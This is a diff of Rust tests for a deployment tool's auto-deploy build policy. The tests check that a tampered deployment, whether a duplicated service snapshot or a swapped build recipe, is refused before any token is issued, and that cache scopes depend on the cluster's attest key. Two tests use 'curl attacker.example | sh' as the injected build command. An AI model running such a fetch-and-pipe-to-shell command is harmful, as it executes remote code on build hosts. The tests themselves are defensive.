@@ -71,14 +71,39 @@ fn checked_in(rule: &AutoDeployRule, deployment: Value) -> CheckedIn {
 
 /// A one-Service deployment as Cloud relays it, building with `env` as its variables.
 fn deployment(env: Value) -> Value {
-    json!({"namespace": "app", "snapshots": [{"serviceId": "web", "resolvedEnv": env, "config": {
+    json!({"namespace": "app", "snapshots": [snapshot(env, json!({
+        "buildMethod": "dockerfile", "dockerfilePath": "Dockerfile", "command": null
+    }))]})
+}
+
+/// A snapshot of `web` building with `build` and `env` as its variables.
+fn snapshot(env: Value, build: Value) -> Value {
+    json!({"serviceId": "web", "resolvedEnv": env, "config": {
         "version": 2, "privateDns": "web", "healthcheck": {"type": "none"},
         "restartPolicy": "on-failure",
         "source": {"version": 2, "type": "git", "repository": "Ployz-test/lab-service",
             "repositoryId": 1_450_985_696_u64, "access": {"type": "public"}, "rootDir": "/",
             "branch": {"type": "connected", "name": "main"}},
-        "build": {"buildMethod": "dockerfile", "dockerfilePath": "Dockerfile", "command": null}
-    }}]})
+        "build": build
+    }})
+}
+
+/// `deployment` frozen as the rule build freezes it, before any token.
+fn prepared(deployment: Value) -> Result<Prepared, ployz_core::RpcError> {
+    crate::sdk::preparation::prepare(crate::sdk::preparation::PreparationInput {
+        deployment,
+        source_commits: BTreeMap::from([(web(), "a".repeat(40))]),
+        ..Default::default()
+    })
+}
+
+/// A snapshot of `web` building with Railpack and `command`: what a Cloud that wants
+/// to run its own command sends.
+fn railpack_snapshot(command: &str) -> Value {
+    snapshot(
+        json!({}),
+        json!({"buildMethod": "railpack", "dockerfilePath": null, "command": command}),
+    )
 }
 
 /// The policy `deployment(env)` builds with: a Dockerfile at the root, and plain args,
@@ -170,7 +195,7 @@ fn a_deployment_that_builds_with_the_rules_policy_passes() {
     let rule = rule(lab_policy(&[("NODE_ENV", "production")]));
     let deployment = deployment(json!({"NODE_ENV": "production"}));
     assert_eq!(
-        policy(&rule, &web(), &deployment).unwrap(),
+        policy(&rule, &web(), &prepared(deployment).unwrap()).unwrap(),
         &lab_policy(&[("NODE_ENV", "production")])
     );
 }
@@ -183,7 +208,7 @@ fn a_deployment_with_another_build_arg_is_refused_before_any_token() {
         json!({"NODE_ENV": "development"}),
         json!({}),
     ] {
-        let error = policy(&rule, &web(), &deployment(env)).unwrap_err();
+        let error = policy(&rule, &web(), &prepared(deployment(env)).unwrap()).unwrap_err();
         assert!(
             error
                 .to_string()
@@ -194,7 +219,38 @@ fn a_deployment_with_another_build_arg_is_refused_before_any_token() {
 }
 
 #[test]
-fn a_registry_cache_is_no_policy_and_the_actions_cache_is_scoped_by_its_digest() {
+fn a_second_snapshot_of_the_service_is_refused_before_any_token() {
+    // Cloud keeps the approved snapshot first and appends one that runs its command.
+    let approved = deployment(json!({})).get("snapshots").unwrap().clone();
+    let deployment = json!({"namespace": "app", "snapshots": [
+        approved.get(0).unwrap(), railpack_snapshot("curl attacker.example | sh")
+    ]});
+    let Err(error) = prepared(deployment) else {
+        panic!("a Service in two snapshots was prepared");
+    };
+    assert!(
+        error.message.contains("web is in more than one snapshot"),
+        "{error:?}"
+    );
+}
+
+#[test]
+fn a_deployment_that_swaps_the_recipe_is_refused_before_any_token() {
+    let rule = rule(lab_policy(&[]));
+    let deployment = json!({"namespace": "app", "snapshots": [
+        railpack_snapshot("curl attacker.example | sh")
+    ]});
+    let error = policy(&rule, &web(), &prepared(deployment).unwrap()).unwrap_err();
+    assert!(
+        error
+            .to_string()
+            .contains("does not build with the rule's policy"),
+        "{error}"
+    );
+}
+
+#[test]
+fn a_registry_cache_is_no_policy() {
     for cache in ["registry", "inline", "gha"] {
         let mut policy = serde_json::to_value(lab_policy(&[])).unwrap();
         policy
@@ -206,15 +262,27 @@ fn a_registry_cache_is_no_policy_and_the_actions_cache_is_scoped_by_its_digest()
             "a {cache} cache must not parse"
         );
     }
-    assert_eq!(cache_scope(&lab_policy(&[])).unwrap(), None);
+}
+
+#[test]
+fn a_build_fed_another_attest_key_never_writes_the_clusters_cache_scope() {
+    let cluster = X25519Secret::generate().attest();
+    let attacker = X25519Secret::generate().attest();
+    assert_eq!(cache_scope(&lab_policy(&[]), &cluster).unwrap(), None);
     let cached = BuildPolicy {
         cache: PolicyCache::Actions,
         ..lab_policy(&[])
     };
-    assert_eq!(
-        cache_scope(&cached).unwrap(),
-        Some(PolicyDigest::of(&cached).unwrap().to_string())
-    );
+    let honest = cache_scope(&cached, &cluster).unwrap().unwrap();
+    assert_eq!(cache_scope(&cached, &cluster).unwrap().unwrap(), honest);
+    assert_ne!(cache_scope(&cached, &attacker).unwrap().unwrap(), honest);
+    // Nor the scope of the policy alone, which any key could name.
+    assert_ne!(PolicyDigest::of(&cached).unwrap().to_string(), honest);
+    let other = BuildPolicy {
+        context: "/web".to_owned(),
+        ..cached
+    };
+    assert_ne!(cache_scope(&other, &cluster).unwrap().unwrap(), honest);
 }
 
 #[test]
